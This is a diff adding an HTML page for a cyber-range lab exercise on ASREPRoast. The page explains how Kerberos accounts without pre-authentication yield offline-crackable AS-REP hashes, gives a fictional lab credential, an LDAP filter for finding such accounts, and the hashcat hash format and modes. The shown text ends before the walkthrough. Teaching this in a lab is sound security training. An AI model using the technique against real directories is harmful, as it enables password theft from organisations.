@@ -1,0 +1,1711 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Network forensics exercises for OpenCyberRange">
+      
+      
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.2">
+    
+    
+      
+        <title>Exercise 3.2: ASREPRoast - Network Forensics</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css?v=4">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#exercise-32-asreproast" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Network Forensics" class="md-header__button md-logo" aria-label="Network Forensics" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Network Forensics
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Exercise 3.2: ASREPRoast
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="purple"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="deep-purple" data-md-color-accent="purple"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Network Forensics" class="md-nav__button md-logo" aria-label="Network Forensics" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Network Forensics
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH N1 -- Log Analysis
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH N1 -- Log Analysis
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/01_Port_Scan_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.1 -- Port Scan Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/02_HTTP_Traffic_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.2 -- HTTP Traffic Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/03_DNS_Anomaly_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.3 -- DNS Anomaly Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/04_Failed_Login_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.4 -- Failed Login Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/05_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH N2 -- PCAP Forensics
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH N2 -- PCAP Forensics
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/01_FTP_Credential_Extraction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.1 -- FTP Credential Extraction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/02_SMTP_Email_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.2 -- SMTP Email Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/03_HTTP_Session_Hijacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.3 -- HTTP Session Hijacking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/04_DNS_Data_Exfiltration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.4 -- DNS Data Exfiltration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/05_Attack_Chain_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.5 -- Attack Chain Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/06_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH N3 -- Firewalls
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH N3 -- Firewalls
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NETSY12_Firewalls/01_Firewall_Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.1 -- Firewall Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NETSY12_Firewalls/02_Firewall_Policy_Hardening/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.2 -- Firewall Policy Hardening
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#before-you-begin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Before You Begin
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#your-objectives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Your Objectives
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Your Objectives">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#normal-as-exchange-vs-asreproast" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Normal AS Exchange vs ASREPRoast
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etype-choice-drives-crack-speed" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Etype Choice Drives Crack Speed
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#background-why-dont_req_preauth-exists-and-why-it-survives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Background: Why DONT_REQ_PREAUTH Exists and Why It Survives
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Background: Why DONT_REQ_PREAUTH Exists and Why It Survives">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#the-ldap-filter" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The LDAP filter
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-as-rep-hash-format" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The AS-REP hash format
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tool-primer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tool Primer
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Tool Primer">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ldap-query-for-as-rep-roastable-users" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LDAP query for AS-REP-roastable users
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#getnpuserspy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GetNPUsers.py
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hashcat-mode-18200" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        hashcat mode 18200
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#walkthrough" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Walkthrough
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Walkthrough">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-find-as-rep-roastable-accounts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1: Find AS-REP-roastable Accounts
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-build-a-users-file" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2: Build a Users File
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-request-the-as-rep" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3: Request the AS-REP
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-crack-with-hashcat" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 4: Crack with hashcat
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-submit-the-plaintext" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 5: Submit the Plaintext
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blue-team-perspective" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blue Team Perspective
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hardening-note" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hardening Note
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Hardening Note">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#record-your-findings" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Record Your Findings
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analysis-questions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Analysis Questions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-takeaways" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key Takeaways
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cheat-sheet-recap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cheat Sheet Recap
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#spaced-repetition" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Spaced Repetition
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="exercise-32-asreproast">Exercise 3.2: ASREPRoast</h1>
+<h2 id="before-you-begin">Before You Begin</h2>
+<p>Pre-authentication is the timestamp the client encrypts with its password-derived key inside an AS-REQ. The KDC verifies the timestamp before issuing an AS-REP. The check stops an attacker from blind-fetching crackable AS-REPs for arbitrary users. Disable pre-auth on a user (the <code>DONT_REQ_PREAUTH</code> flag in <code>userAccountControl</code>) and the KDC happily issues AS-REPs without any check; the encrypted enc-part is then crackable offline because it is encrypted with a derivation of the user's password.</p>
+<p>Exercise 3.2 asks you to find one such user in Nordport's directory and crack their AS-REP. The recovered password is your flag.</p>
+<p><strong>Tools required:</strong> <code>impacket-GetNPUsers</code> (often <code>GetNPUsers.py</code>), <code>hashcat</code>, <code>ldapsearch</code>. All pre-installed on Kali.</p>
+<h2 id="scenario">Scenario</h2>
+<p>Marcus Bell: "Pre-auth is on by default. When it is off, the KDC will hand out an encrypted blob to anyone who asks. Engineering has a service account from 2019 that still has it disabled. The blob is encrypted with the account's key. If the password is weak, you crack it offline."</p>
+<p>The target account is <code>svc_legacy_&lt;token&gt;</code>. The password you crack is the flag.</p>
+<p><strong>Credentials:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+<th>Use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>j.chen</code></td>
+<td><code>Welcome2026#</code></td>
+<td>LDAP enumeration only (the AS-REP attack itself is unauthenticated)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Domain:</strong> <code>corp.nordport.local</code></p>
+<h2 id="your-objectives">Your Objectives</h2>
+<ul>
+<li>Find every user with <code>DONT_REQ_PREAUTH</code> set</li>
+<li>Identify your scope-token account</li>
+<li>Request its AS-REP without authentication</li>
+<li>Crack the AS-REP with hashcat mode 18200</li>
+<li>Submit the recovered plaintext</li>
+</ul>
+<h3 id="normal-as-exchange-vs-asreproast">Normal AS Exchange vs ASREPRoast</h3>
+<p>The diagram contrasts the two flows side by side. The only difference is one missing field in the AS-REQ; the consequence is a crackable hash you can ask for unauthenticated.</p>
+<pre class="mermaid"><code>sequenceDiagram
+    autonumber
+    participant C as Attacker (Kali)
+    participant K as KDC (corp-dc01)
+
+    Note over C,K: Normal user (preauth required)
+    C-&gt;&gt;K: AS-REQ for victim&lt;br/&gt;(no pA-ENC-TIMESTAMP)
+    K--&gt;&gt;C: KRB-ERROR KDC_ERR_PREAUTH_REQUIRED
+    Note right of C: cannot proceed unauthenticated
+
+    Note over C,K: ASREPRoast target (DONT_REQ_PREAUTH set)
+    C-&gt;&gt;K: AS-REQ for svc_legacy&lt;br/&gt;(no pA-ENC-TIMESTAMP)
+    K--&gt;&gt;C: AS-REP&lt;br/&gt;enc-part encrypted with user_key
+    Note right of C: $krb5asrep$23$user@REALM:...&lt;br/&gt;cracked offline w/ hashcat -m 18200</code></pre>
+<h3 id="etype-choice-drives-crack-speed">Etype Choice Drives Crack Speed</h3>
+<p>Three encryption types appear in the wild. The table below tells you which hashcat mode to launch and how aggressively to expect a crack.</p>
+<table>
+<thead>
+<tr>
+<th>Etype</th>
+<th>Algorithm</th>
+<th>Hash prefix</th>
+<th>Hashcat mode</th>
+<th>Relative crack speed</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>23</td>
+<td>RC4-HMAC</td>
+<td><code>$krb5asrep$23$</code></td>
+<td>18200</td>
+<td>fastest (often 2-10x AES)</td>
+</tr>
+<tr>
+<td>17</td>
+<td>AES128</td>
+<td><code>$krb5asrep$17$</code></td>
+<td>18201</td>
+<td>medium</td>
+</tr>
+<tr>
+<td>18</td>
+<td>AES256</td>
+<td><code>$krb5asrep$18$</code></td>
+<td>18202</td>
+<td>slowest</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="background-why-dont_req_preauth-exists-and-why-it-survives">Background: Why DONT_REQ_PREAUTH Exists and Why It Survives</h2>
+<p>When Kerberos was added to Windows 2000, some legacy applications and downlevel clients did not implement the timestamp-encrypted pre-authentication step in the AS-REQ. To support those clients, Microsoft kept a per-user flag (<code>DONT_REQ_PREAUTH</code>, <code>0x400000</code>) in the <code>userAccountControl</code> bitmask that disables the timestamp requirement. The KDC, seeing the flag, returns an AS-REP without checking the timestamp first.</p>
+<p>Modern protocols universally support pre-authentication. The flag survives in production because:</p>
+<ol>
+<li>A legacy integration once required it and was never re-tested after the integration was deprecated</li>
+<li>An operator set it temporarily ("just to get the script working") and forgot to revert</li>
+<li>A migration from a 2003-era domain preserved the flag set on accounts that used to need it</li>
+<li>A naive scripted account creation routine used a UAC value template that included the flag</li>
+</ol>
+<p>Defenders find these accounts with one LDAP query (below). Attackers find them with the same query and add <code>GetNPUsers.py</code>. The audit-side fix is a one-line Set-ADAccountControl; the discoverable-with-one-LDAP-query nature of the flag is why it is so reliably hit on internal pentests.</p>
+<h3 id="the-ldap-filter">The LDAP filter</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
+</code></pre></div>
+<p>Decoding:
+- <code>objectCategory=person</code>, <code>objectClass=user</code>: limit to user accounts
+- <code>userAccountControl:1.2.840.113556.1.4.803:=4194304</code>: bitwise AND match (OID <code>1.2.840.113556.1.4.803</code>) of the UAC field against <code>0x400000</code> (decimal 4194304)</p>
+<p>The OID is <code>LDAP_MATCHING_RULE_BIT_AND</code>. Every LDAP search against UAC flags uses one of: <code>1.2.840.113556.1.4.803</code> (AND) or <code>1.2.840.113556.1.4.804</code> (OR).</p>
+<h3 id="the-as-rep-hash-format">The AS-REP hash format</h3>
+<p><code>GetNPUsers.py</code> returns hashes formatted for hashcat:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>$krb5asrep$23$svc_legacy_a7f3@CORP.NORDPORT.LOCAL:&lt;server_challenge&gt;$&lt;encrypted_blob&gt;
